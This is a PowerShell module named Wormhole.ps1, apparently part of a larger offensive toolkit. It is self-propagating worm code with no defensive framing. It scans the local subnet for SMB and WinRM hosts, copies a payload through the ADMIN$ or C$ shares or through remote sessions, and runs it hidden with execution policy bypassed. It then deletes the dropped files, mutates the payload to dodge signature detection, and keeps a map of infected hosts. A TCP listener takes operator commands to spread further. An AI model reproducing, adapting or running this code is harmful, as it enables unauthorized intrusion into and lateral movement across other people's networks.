# Modules/Wormhole.ps1 v1.6.0
# Wormhole Protocol - Advanced stealth propagation with network discovery
# Memory-only propagation with operator handshake gating

$script:Version = "1.6.0"
$script:InfectionMap = @{}
$script:DiscoveredHosts = @{}
$script:OperatorKey = 'RvL_0517'
$script:WormholeActive = $false
$script:PropagationStats = @{
    Attempts = 0
    Successes = 0
    Failures = 0
    Blocked = 0
}

function Write-WormholeLog {
    param([string]$Message, [string]$Level = "INFO")
    $logFile = "$env:ProgramData\ghost_ops_log.txt"
    $timestamp = Get-Date -Format o
    try {
        Add-Content -Path $logFile -Value "[$timestamp][Wormhole][$Level] $Message" -ErrorAction SilentlyContinue
    } catch {}
}

function Get-OperatorSignature {
    param([string]$Data)
    $kb = [Text.Encoding]::UTF8.GetBytes($script:OperatorKey)
    $db = [Text.Encoding]::UTF8.GetBytes($Data)
    $h = New-Object System.Security.Cryptography.HMACSHA256
    $h.Key = $kb
    return ([BitConverter]::ToString($h.ComputeHash($db))) -replace '-', ''
}

function Test-OperatorHandshake {
    param(
        [string]$Challenge,
        [string]$Response
    )
    $expected = Get-OperatorSignature -Data $Challenge
    return ($expected -eq $Response)
}

function Test-AlreadyInfected {
    param([string]$HostId)
    return $script:InfectionMap.ContainsKey($HostId)
}

function Register-Infection {
    param(
        [string]$HostId,
        [string]$Method = "Unknown",
        [hashtable]$Metadata = @{}
    )
    
    $script:InfectionMap[$HostId] = @{
        Timestamp = (Get-Date).ToUniversalTime()
        Status = "Active"
        Method = $Method
        Metadata = $Metadata
    }
    Write-WormholeLog "Registered infection for host: $HostId via $Method"
}

function Get-HostIdentifier {
    param([string]$HostName = $env:COMPUTERNAME)
    
    try {
        $mac = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object -First 1).MacAddress
    } catch {
        $mac = "UNKNOWN"
    }
    return Get-OperatorSignature -Data "$HostName|$mac"
}

function Invoke-NetworkDiscovery {
    param(
        [string]$Subnet,
        [switch]$Fast,
        [int]$Timeout = 1000
    )
    
    Write-WormholeLog "Starting network discovery..."
    
    if (-not $Subnet) {
        try {
            $localIP = (Get-NetIPAddress -AddressFamily IPv4 | 
                       Where-Object { $_.InterfaceAlias -notmatch "Loopback" -and $_.IPAddress -notmatch "^169" } | 
                       Select-Object -First 1).IPAddress
            $Subnet = $localIP -replace '\.\d+$', ''
        } catch {
            Write-WormholeLog "Could not determine local subnet" "ERROR"
            return @()
        }
    }
    
    Write-WormholeLog "Scanning subnet: $Subnet.0/24"
    
    $discovered = @()
    $pingJobs = @()
    
    $range = if ($Fast) { 1..50 + 100..150 + 200..254 } else { 1..254 }
    
    foreach ($octet in $range) {
        $ip = "$Subnet.$octet"
        
        $pingJobs += [PSCustomObject]@{
            IP = $ip
            Task = [System.Net.NetworkInformation.Ping]::new().SendPingAsync($ip, $Timeout)
        }
    }
    
    foreach ($job in $pingJobs) {
        try {
            $result = $job.Task.GetAwaiter().GetResult()
            if ($result.Status -eq 'Success') {
                $hostInfo = @{
                    IP = $job.IP
                    Hostname = "Unknown"
                    RTT = $result.RoundtripTime
                    DiscoveredAt = (Get-Date).ToUniversalTime()
                    SMBOpen = $false
                    WinRMOpen = $false
                }
                
                try {
                    $hostInfo.Hostname = [System.Net.Dns]::GetHostEntry($job.IP).HostName
                } catch {}
                
                $hostInfo.SMBOpen = Test-NetConnection -ComputerName $job.IP -Port 445 -WarningAction SilentlyContinue -InformationLevel Quiet
                $hostInfo.WinRMOpen = Test-NetConnection -ComputerName $job.IP -Port 5985 -WarningAction SilentlyContinue -InformationLevel Quiet
                
                $discovered += $hostInfo
                $script:DiscoveredHosts[$job.IP] = $hostInfo
                
                Write-WormholeLog "Discovered: $($job.IP) ($($hostInfo.Hostname)) SMB:$($hostInfo.SMBOpen) WinRM:$($hostInfo.WinRMOpen)"
            }
        } catch {}
    }
    
    Write-WormholeLog "Discovery complete: $($discovered.Count) hosts found"
    return $discovered
}

function Get-SpreadTargets {
    param(
        [switch]$SMBOnly,
        [switch]$WinRMOnly,
        [int]$Limit = 10
    )
    
    $targets = $script:DiscoveredHosts.Values | Where-Object {
        $hostId = Get-HostIdentifier -HostName $_.Hostname
        -not (Test-AlreadyInfected -HostId $hostId)
    }
    
    if ($SMBOnly) {
        $targets = $targets | Where-Object { $_.SMBOpen }
    }
    
    if ($WinRMOnly) {
        $targets = $targets | Where-Object { $_.WinRMOpen }
    }
    
    return $targets | Select-Object -First $Limit
}

function Invoke-WormholeSpread {
    param(
        [Parameter(Mandatory)]
        [string]$TargetHost,
        
        [string]$PayloadPath,
        
        [ValidateSet("SMB", "WinRM", "Auto")]
        [string]$Method = "Auto",
        
        [switch]$Force
    )
    
    $script:PropagationStats.Attempts++
    
    $targetId = Get-HostIdentifier -HostName $TargetHost
    
    if (-not $Force -and (Test-AlreadyInfected -HostId $targetId)) {
        Write-WormholeLog "Skipping $TargetHost - already infected"
        $script:PropagationStats.Blocked++
        return $false
    }
    
    if (-not (Test-BLEOperatorPresent)) {
        Write-WormholeLog "No BLE operator detected - hard-fail exit" "WARN"
        $script:PropagationStats.Blocked++
        return $false
    }
    
    Write-WormholeLog "Attempting spread to $TargetHost via $Method"
    
    try {
        $success = $false
        
        if ($Method -eq "Auto" -or $Method -eq "WinRM") {
            $success = Invoke-WinRMSpread -TargetHost $TargetHost -PayloadPath $PayloadPath
        }
        
        if (-not $success -and ($Method -eq "Auto" -or $Method -eq "SMB")) {
            $success = Invoke-SMBSpread -TargetHost $TargetHost -PayloadPath $PayloadPath
        }
        
        if ($success) {
            Register-Infection -HostId $targetId -Method $Method -Metadata @{ 
                TargetHost = $TargetHost
                SpreadTime = (Get-Date).ToUniversalTime()
            }
            $script:PropagationStats.Successes++
            Write-WormholeLog "Spread to $TargetHost successful" "SUCCESS"
        } else {
            $script:PropagationStats.Failures++
            Write-WormholeLog "Spread to $TargetHost failed" "WARN"
        }
        
        return $success
        
    } catch {
        $script:PropagationStats.Failures++
        Write-WormholeLog "Spread to $TargetHost error: $_" "ERROR"
        return $false
    }
}

function Invoke-SMBSpread {
    param(
        [string]$TargetHost,
        [string]$PayloadPath
    )
    
    try {
        $adminShare = "\\$TargetHost\ADMIN$"
        if (-not (Test-Path $adminShare)) {
            $c_share = "\\$TargetHost\C$"
            if (-not (Test-Path $c_share)) {
                return $false
            }
            $adminShare = $c_share
        }
        
        $remotePath = "$adminShare\Windows\Temp\ghost_payload_$(Get-Random).ps1"
        
        if (-not $PayloadPath -or -not (Test-Path $PayloadPath)) {
            $PayloadPath = Join-Path $PSScriptRoot "..\GhostResidency.ps1"
        }
        
        if (Test-Path $PayloadPath) {
            $payloadContent = Get-Content $PayloadPath -Raw
            $mutatedPayload = Invoke-PayloadMutation -Content $payloadContent
            
            Set-Content -Path $remotePath -Value $mutatedPayload -Force
            
            $localPath = $remotePath -replace '^\\\\.+?\\[^\\]+', 'C:'
            
            $result = Invoke-Command -ComputerName $TargetHost -ScriptBlock {
                param($path)
                if (Test-Path $path) {
                    Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$path`""
                    Start-Sleep -Seconds 2
                    Remove-Item $path -Force -ErrorAction SilentlyContinue
                    return $true
                }
                return $false
            } -ArgumentList $localPath -ErrorAction SilentlyContinue
            
            return $result
        }
        
    } catch {
        Write-WormholeLog "SMB spread failed: $_" "ERROR"
    }
    
    return $false
}

function Invoke-WinRMSpread {
    param(
        [string]$TargetHost,
        [string]$PayloadPath
    )
    
    try {
        $session = New-PSSession -ComputerName $TargetHost -ErrorAction SilentlyContinue
        if (-not $session) { return $false }
        
        try {
            if (-not $PayloadPath -or -not (Test-Path $PayloadPath)) {
                $PayloadPath = Join-Path $PSScriptRoot "..\GhostResidency.ps1"
            }
            
            if (Test-Path $PayloadPath) {
                $payloadContent = Get-Content $PayloadPath -Raw
                $mutatedPayload = Invoke-PayloadMutation -Content $payloadContent
                
                $result = Invoke-Command -Session $session -ScriptBlock {
                    param($content)
                    $tempPath = "$env:TEMP\ghost_$(Get-Random).ps1"
                    Set-Content -Path $tempPath -Value $content
                    Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tempPath`""
                    Start-Sleep -Seconds 2
                    Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
                    return $true
                } -ArgumentList $mutatedPayload
                
                return $result
            }
            
        } finally {
            Remove-PSSession -Session $session -ErrorAction SilentlyContinue
        }
        
    } catch {
        Write-WormholeLog "WinRM spread failed: $_" "ERROR"
    }
    
    return $false
}

function Invoke-PayloadMutation {
    param([string]$Content)
    
    $mutations = @(
        { param($c) 
            $funcName = "Ghost$([guid]::NewGuid().ToString().Substring(0,8))"
            $c -replace 'function\s+(\w+)', "function $funcName`_`$1"
        },
        { param($c) 
            $junkComment = "# $([guid]::NewGuid().ToString()) - $(Get-Date -Format o)"
            "$junkComment`n$c"
        },
        { param($c)
            $c -replace '#.*$', '' -replace '^\s*$\n', ''
        },
        { param($c)
            $lines = $c -split "`n"
            $shuffledComments = $lines | Where-Object { $_ -match '^\s*#' } | Get-Random -Count ([math]::Min(5, ($lines | Where-Object { $_ -match '^\s*#' }).Count))
            $junk = @("# GhostMutation: $([guid]::NewGuid())", "# Timestamp: $(Get-Date -Format o)")
            ($junk + $lines) -join "`n"
        }
    )
    
    $mutation = $mutations | Get-Random
    return (& $mutation $Content)
}

function Test-BLEOperatorPresent {
    try {
        $bleDevices = Get-PnpDevice -Class Bluetooth -Status OK -ErrorAction SilentlyContinue
        foreach ($device in $bleDevices) {
            if ($device.FriendlyName -match "Ghost|Flipper|Operator|Raven|Beacon") {
                return $true
            }
        }
    } catch {}
    
    if (Test-Path "$env:ProgramData\.ghost_ble_active") {
        $markerAge = ((Get-Date) - (Get-Item "$env:ProgramData\.ghost_ble_active").LastWriteTime).TotalMinutes
        if ($markerAge -lt 15) {
            return $true
        }
    }
    
    if (Test-Path "$env:ProgramData\.ghost.cfg") {
        try {
            $cfg = Get-Content "$env:ProgramData\.ghost.cfg" | ConvertFrom-Json
            if ($cfg.signature -and $cfg.ghostTag) {
                return $true
            }
        } catch {}
    }
    
    return $false
}

function Start-WormholeListener {
    param(
        [int]$Port = 8787,
        [int]$Timeout = 300,
        [switch]$AutoSpread
    )
    
    if ($script:WormholeActive) {
        Write-WormholeLog "Wormhole already active"
        return
    }
    
    $script:WormholeActive = $true
    Write-WormholeLog "Wormhole listener starting on port $Port"
    
    $hostId = Get-HostIdentifier
    if (-not (Test-AlreadyInfected -HostId $hostId)) {
        Register-Infection -HostId $hostId -Method "Origin"
    }
    
    if ($AutoSpread) {
        Write-WormholeLog "Auto-spread enabled. Running network discovery..."
        $targets = Invoke-NetworkDiscovery -Fast
        $spreadTargets = Get-SpreadTargets -Limit 5
        
        foreach ($target in $spreadTargets) {
            Invoke-WormholeSpread -TargetHost $target.IP -Method "Auto"
            Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)
        }
    }
    
    try {
        $listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, $Port)
        $listener.Start()
        
        $startTime = Get-Date
        
        while ($script:WormholeActive) {
            if (((Get-Date) - $startTime).TotalSeconds -gt $Timeout) {
                Write-WormholeLog "Wormhole timeout reached"
                break
            }
            
            if ($listener.Pending()) {
                $client = $listener.AcceptTcpClient()
                $stream = $client.GetStream()
                $reader = New-Object System.IO.StreamReader($stream)
                $writer = New-Object System.IO.StreamWriter($stream)
                
                try {
                    $challenge = [guid]::NewGuid().ToString()
                    $writer.WriteLine("CHALLENGE:$challenge")
                    $writer.Flush()
                    
                    $response = $reader.ReadLine()
                    
                    if (Test-OperatorHandshake -Challenge $challenge -Response $response) {
                        $writer.WriteLine("ACK")
                        $writer.Flush()
                        
                        $command = $reader.ReadLine()
                        Process-WormholeCommand -Command $command -Writer $writer
                    } else {
                        $writer.WriteLine("REJECT")
                        Write-WormholeLog "Rejected unauthorized connection" "WARN"
                    }
                } finally {
                    $client.Close()
                }
            }
            
            Start-Sleep -Milliseconds 100
        }
        
    } catch {
        Write-WormholeLog "Wormhole error: $_" "ERROR"
    } finally {
        if ($listener) { $listener.Stop() }
        $script:WormholeActive = $false
        Write-WormholeLog "Wormhole listener stopped"
    }
}

function Stop-WormholeListener {
    $script:WormholeActive = $false
    Write-WormholeLog "Wormhole shutdown requested"
}

function Process-WormholeCommand {
    param(
        [string]$Command,
        [System.IO.StreamWriter]$Writer
    )
    
    $parts = $Command -split ':'
    $action = $parts[0].ToUpper()
    
    switch ($action) {
        "SPREAD" {
            $target = $parts[1]
            $method = if ($parts.Count -gt 2) { $parts[2] } else { "Auto" }
            $result = Invoke-WormholeSpread -TargetHost $target -Method $method
            $Writer.WriteLine("SPREAD:$target:$result")
        }
        "DISCOVER" {
            $subnet = if ($parts.Count -gt 1) { $parts[1] } else { $null }
            $hosts = Invoke-NetworkDiscovery -Subnet $subnet -Fast
            $Writer.WriteLine("DISCOVER:HOSTS:$($hosts.Count)")
        }
        "TARGETS" {
            $targets = Get-SpreadTargets -Limit 20
            $targetList = ($targets | ForEach-Object { "$($_.IP)|$($_.Hostname)" }) -join ','
            $Writer.WriteLine("TARGETS:$targetList")
        }
        "STATUS" {
            $count = $script:InfectionMap.Count
            $discovered = $script:DiscoveredHosts.Count
            $Writer.WriteLine("STATUS:INFECTED:$count:DISCOVERED:$discovered")
        }
        "STATS" {
            $stats = "A:$($script:PropagationStats.Attempts),S:$($script:PropagationStats.Successes),F:$($script:PropagationStats.Failures),B:$($script:PropagationStats.Blocked)"
            $Writer.WriteLine("STATS:$stats")
        }
        "MAP" {
            $map = $script:InfectionMap.Keys -join ','
            $Writer.WriteLine("MAP:$map")
        }
        "SHUTDOWN" {
            $Writer.WriteLine("SHUTDOWN:ACK")
            Stop-WormholeListener
        }
        default {
            $Writer.WriteLine("UNKNOWN:$Command")
        }
    }
    $Writer.Flush()
}

function Get-InfectionMap {
    return $script:InfectionMap.Clone()
}

function Get-DiscoveredHosts {
    return $script:DiscoveredHosts.Clone()
}

function Get-PropagationStats {
    return $script:PropagationStats.Clone()
}

function Clear-InfectionMap {
    $script:InfectionMap.Clear()
    Write-WormholeLog "Infection map cleared"
}

function Clear-DiscoveredHosts {
    $script:DiscoveredHosts.Clear()
    Write-WormholeLog "Discovered hosts cleared"
}

Export-ModuleMember -Function Start-WormholeListener, Stop-WormholeListener
Export-ModuleMember -Function Invoke-WormholeSpread, Invoke-NetworkDiscovery, Get-SpreadTargets
Export-ModuleMember -Function Get-InfectionMap, Get-DiscoveredHosts, Get-PropagationStats
Export-ModuleMember -Function Clear-InfectionMap, Clear-DiscoveredHosts
Export-ModuleMember -Function Test-BLEOperatorPresent, Get-HostIdentifier
